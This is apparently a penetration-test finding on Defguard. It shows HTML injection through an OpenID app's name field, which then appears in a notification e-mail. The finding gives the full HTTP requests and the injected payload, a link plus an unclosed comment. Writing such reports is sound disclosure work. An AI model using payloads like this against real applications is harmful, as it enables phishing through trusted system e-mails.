---
title: "DG25-21: HTML Injection - OpenID login"
severity: Info
cvss_string: "/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"
issue_link: https://github.com/DefGuard/defguard/issues/1551
---

### Technical details

1.  The name of the OpenID app is being changed:

**Request:**\
\
**PUT** /api/v1/oauth/9szvHNlxY6R3jvbX HTTP/2\
**Host:** defguard.dvpnsec.net\
**Cookie:** defguard_session=KENMUulcmfVkD0W8MZjN4Rjw\
\[\...\]

```json
{ 
  "client_secret ": "SHyMugRCmiTkLdo1xtV5IwgrY1dKoHpN ", 
  "enabled ":false, 
  "id ":8, 
  "name ":" <h1 > <a href= '//isec.pl ' >CLICK HERE </a > </h1 > <! -- ", 
  "redirect_uri ": [ "https://isec.pl " ], 
  "scope ": [ "openid " ]
} 
```


\
**Response:**\
\
**HTTP/2** 200 OK\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Content-Type:** application/json\
**Date:** Mon, 11 Aug 2025 10:33:09 GMT\
**Server:** Caddy\
**X-Defguard-Version:** 1.5.0-a29ac10\
**Content-Length:** 2\
\
{}

1.  User authorizes the OpenID:

**Request:**\
\
**POST**
`/api/v1/oauth/authorize?scope=openid&response_type=code&client_id=9szvHNlxY6R3jvbX&redirect_uri=https%3A%2F%2Fisec.pl&state=1113&nonce=test&allow=true`
HTTP/2\
**Host:** defguard.dvpnsec.net\
**Cookie:** defguard_session=0i1uyyokye6n58A0mSLs1VQ7\
\
\
**Response:**\
\
**HTTP/2** 302 Found\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Date:** Mon, 11 Aug 2025 10:35:23 GMT\
**Location:** `https://isec.pl/?code=dmDdZMoVBMztMUodpnDmLsQh&state=1113`\
**Server:** Caddy\
**Content-Length:** 0

1.  An e-mail with HTML injection is being sent:

![](/images/pentest/DG25/img9.png)
